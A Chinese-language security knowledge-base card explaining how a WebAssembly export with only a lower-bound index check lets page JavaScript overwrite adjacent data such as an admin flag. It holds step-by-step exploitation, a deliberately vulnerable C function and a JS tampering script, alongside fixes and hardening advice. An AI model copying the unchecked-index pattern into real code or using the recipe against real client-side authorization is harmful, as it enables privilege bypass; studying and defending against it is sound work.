---
id: web-generic-wasm-unchecked-index-linear-memory-write
title: Wasm 导出函数未校验数组下标导致线性内存内越界写与相邻数据篡改
type: scenario
domain: web
path: web/generic
technique: wasm-unchecked-index-linear-memory-write
tags:
- web
- wasm
- webassembly
- client-side
- memory-corruption
- out-of-bounds
- logic-bypass
cve: []
severity: medium
confidence: medium
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V10
  verified_at: '2026-11-05T01:06:56+08:00'
  notes: 已对照原文与 WASM 语义核对 C 数组下标缺上界校验导致的线性内存内相邻覆盖，并确认卡片已纠正原文 ToInt32/函数表篡改的错误说法；未验证点：未编译执行，相邻变量偏移依赖编译器布局，卡片要求以 wat 实际偏移为准
url: /docs/web/generic/web-generic-wasm-unchecked-index-linear-memory-write/
draft: false
kb_aliases:
- Wasm 数组下标未校验
- Wasm 越界写
- Wasm 篡改 admin_flag
- 线性内存相邻变量覆盖
- C 数组越界编译到 Wasm
---

## 一句话结论

C 代码编译到 Wasm 后，若导出函数对数组下标只做部分校验（如下界检查但缺上界检查），同源 JS 可传入越界但仍在 Wasm 线性内存范围内的下标，覆盖数组之后相邻的全局变量（权限标志、加密开关、密钥等），从而篡改模块行为；该原语局限于 Wasm 线性内存，不等同于浏览器沙箱逃逸或 JS 代码执行。

## 原理

- Wasm 线性内存是一段扁平的、由模块统一分配的字节数组。C 的全局数组、静态变量、字符串常量都按编译器布局放在这段内存里，`data_buf[index]` 被编译为“基址 + index”的地址计算。
- Wasm 运行时的越界检查只保证访问地址落在整段线性内存内；它不知道 C 数组的边界。因此 `index` 只要不超过线性内存总大小，`data_buf[index]` 即使超出数组长度也不会触发 Wasm trap，而是写到数组后面的相邻数据（例如 `admin_flag`、密钥、函数开关）。
- 典型漏洞代码只检查 `index < 0` 或只检查上界而遗漏下界/符号，或做了 `index` 的算术变换后未重新校验。攻击者用 JS 调用导出函数时，参数会按 Wasm 的 `i32` 类型转换：JS Number 经 ToInt32 取模 2³²，不是任意精度整数；因此“传一个天文数字自动变成目标地址”的说法不成立，必须按实际数组基址与目标偏移计算下标。
- 若数组基址为 `B`、`admin_flag` 位于 `B + 100`（编译器紧跟数组、无填充时），则 `index = 100` 即可写到 `admin_flag`；有对齐填充时需从 `.wat` 的 data 段或调试内存中确认实际偏移。
- 影响边界：函数表（`call_indirect` 使用的 table）位于线性内存之外，直接函数调用也不通过线性内存中的“函数指针”；因此本原语不能据此把执行流劫持到 JS 函数，也不能突破 Wasm 沙箱。它能篡改模块内的数据与逻辑（客户端权限判断、加密开关、密钥），在信任客户端判断的场景中造成越权或结果伪造。

## 触发条件

- Wasm 模块导出一个写数组/缓冲区的函数，且对下标缺少完整边界检查（常见：只判 `index < 0`，或只判上界）。
- 目标相邻变量是安全敏感数据（管理员标志、付费/授权开关、加密开关、密钥），且其相对数组的偏移可确定。
- 攻击者能在同源页面执行 JS 并调用该导出函数。
- 模块未启用 `SAFE_HEAP`/ASan 等运行期内存检查；目标地址仍在线性内存范围内。

## 利用步骤

1. 用 `wasm2wat` 反编译模块，定位 `data_buf`、`admin_flag` 等符号对应的 data 段/全局变量偏移与数组长度。
2. 计算目标下标：`index = target_offset - array_base_offset`；若编译器有对齐填充，以 `.wat` 实际偏移为准。
3. 在页面 JS 中取得模块实例，调用导出的写函数，传入该下标与期望值。
4. 调用导出的读取/判断函数（如 `is_admin()`）验证数据是否被改写。
5. 若上界检查存在，检查模块内的有符号/无符号转换或 `index` 算术是否可能溢出绕过；不要依赖 JS 浮点数“溢出”。

## PoC

```c
/* write_module.c：只检查下界，缺少上界检查 */
#include <stdint.h>

static uint8_t config_array[100] = {0};  /* 假设基址 B */
static uint8_t admin_flag = 0;           /* 假设位于 B + 100 */

__attribute__((visibility("default")))
void write_config(int index, uint8_t value) {
    if (index < 0) return;      /* 漏洞：未检查 index >= 100 */
    config_array[index] = value;
}

__attribute__((visibility("default")))
int is_admin(void) {
    return admin_flag;
}
```

```bash
emcc write_module.c -s EXPORTED_FUNCTIONS='["_write_config","_is_admin"]' \
  -s STANDALONE_WASM=1 -o write_module.wasm
wasm2wat write_module.wasm > write_module.wat
# 在 wat 中确认 config_array 与 admin_flag 的 data/global 偏移；
# 若无填充，admin_flag 在 config_array + 100
```

```javascript
async function tamper() {
    const bytes = await (await fetch('write_module.wasm')).arrayBuffer();
    const { instance } = await WebAssembly.instantiate(bytes);
    const writeConfig = instance.exports.write_config;
    const isAdmin = instance.exports.is_admin;

    console.log('before:', isAdmin());   // 0
    writeConfig(100, 1);                 // 写到 config_array[100] == admin_flag
    console.log('after :', isAdmin());   // 1（相邻变量被覆盖）
}
```

```text
# 若编译器在数组与 admin_flag 之间插入对齐填充，index 需按 wat 中
# 两者实际偏移之差调整。传入 index=0x1064 之类“绝对地址”是错误用法：
# 函数参数是数组下标，不是线性内存绝对地址。
```

## 变体与关联

- 变体：写入类型可能是 `uint8_t`/`int32`/`float`，覆盖宽度不同；也可通过越界读泄露相邻数据。
- 变体：若检查为 `index >= 0 && index < 100`，可审计模块内 `index` 的算术（如 `index + offset`、有符号/无符号转换）是否存在整数溢出；JS 侧传入的 Number 会先 ToInt32，不能直接构造 64 位大整数。
- 变体：同类 C 层错误还包括 `memcpy` 长度未校验、字符串拼接溢出、格式化函数写入固定缓冲区等。
- 关联：[[web-generic-wasm-exported-memory-secret-read]]（同源 JS 读取线性内存中的密钥/常量）。
- 边界：`SAFE_HEAP=1`、Wasm ASan、显式边界检查、把数组放到独立内存页或使用长度前缀可阻断；地址超出线性内存会触发 Wasm trap，不是任意地址写；该原语不等于宿主沙箱逃逸，也不直接获得 JS 代码执行。

## 检测与防御

- 修复：所有数组/缓冲区写入做完整上下界检查（同时校验 `index >= 0` 与 `index < len`），使用 `size_t` 并避免有符号/无符号混用；对长度参数做上限校验。
- 加固：编译时启用 `-s SAFE_HEAP=1`、`-s ASSERTIONS=1`，并使用 Clang 静态分析/ASan 检测 C 层越界；对敏感标志使用独立结构并校验完整性。
- 加固：不要把安全关键决策只放在客户端 Wasm 中；授权、付费、管理员判断应由服务端执行；导出接口只暴露必要的高层函数，避免直接暴露原始写函数。
- 检测：审计 Wasm 导出函数的边界检查与 C 源码；前端监控全内存扫描/异常写入行为（能力有限，主要依赖代码审计与编译期检查）。
